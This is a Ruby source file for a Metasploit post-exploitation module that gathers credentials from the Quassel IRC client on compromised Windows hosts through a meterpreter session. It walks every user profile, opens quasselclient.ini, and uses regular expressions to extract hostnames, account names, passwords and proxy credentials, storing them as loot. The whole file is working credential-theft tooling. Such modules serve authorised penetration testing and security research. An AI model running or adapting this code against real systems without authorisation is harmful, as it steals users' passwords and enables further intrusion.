##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  # this associative array defines the artifacts known to PackRat
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Packrat
  ARTIFACTS =
    {
      application: 'Quassel IRC',
      app_category: 'IRC',
      gatherable_artifacts: [
        {
          filetypes: 'bookmarks',
          path: 'AppData',
          dir: 'quassel-irc.org',
          artifact_file_name: 'quasselclient.ini',
          description: 'Saved Bookmarks',
          credential_type: 'text',
          regex_search: [
            {
              extraction_description: 'Searches for credentials (USERNAMES/PASSWORDS)',
              extraction_type: 'credentials',
              regex: [
                '(?i-mx:[0-9]+\\\HostName=.*)',
                '(?i-mx:[0-9]+\\\Port=.*)',
                '(?i-mx:[0-9]+\\\AccountName.*)',
                '(?i-mx:[0-9]+\\\Password=.*)',
                '(?i-mx:[0-9]+\\\ProxyHostName=.*)',
                '(?i-mx:[0-9]+\\\ProxyPort=.*)',
                '(?i-mx:[0-9]+\\\ProxyUser.*)',
                '(?i-mx:[0-9]+\\\ProxyPassword=.*)',
              ]
            }
          ]
        }
      ]
    }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Quassel IRC credential gatherer',
        'Description' => %q{
          PackRat is a post-exploitation module that gathers file and information artifacts from end users' systems.
          PackRat searches for and downloads files of interest (such as config files, and received and deleted emails) and extracts information (such as contacts and usernames and passwords), using regexp, JSON, XML, and SQLite queries.
          Further details can be found in the module documentation.
          This is a module that searches for credentials stored on Quassel IRC Client in a windows remote host.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Jacob Tierney',
          'Kazuyoshi Maruta',
          'Daniel Hallsworth',
          'Barwar Salim M',
          'Z. Cliffe Schreuders' # http://z.cliffe.schreuders.org
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database', true]),
        OptBool.new('EXTRACT_DATA', [false, 'Extract data and stores in a separate file', true]),
        # enumerates the options based on the artifacts that are defined below
        OptEnum.new('ARTIFACTS', [false, 'Type of artifacts to collect', 'All', ARTIFACTS[:gatherable_artifacts].map { |k| k[:filetypes] }.uniq.unshift('All')])
      ]
    )
  end

  def run
    print_status('Filtering based on these selections:  ')
    print_status("ARTIFACTS: #{datastore['ARTIFACTS'].capitalize}")
    print_status("STORE_LOOT: #{datastore['STORE_LOOT']}")
    print_status("EXTRACT_DATA: #{datastore['EXTRACT_DATA']}\n")

    # used to grab files for each user on the remote host
    grab_user_profiles.each do |userprofile|
      run_packrat(userprofile, ARTIFACTS)
    end

    print_status 'PackRat credential sweep Completed'
  end
end
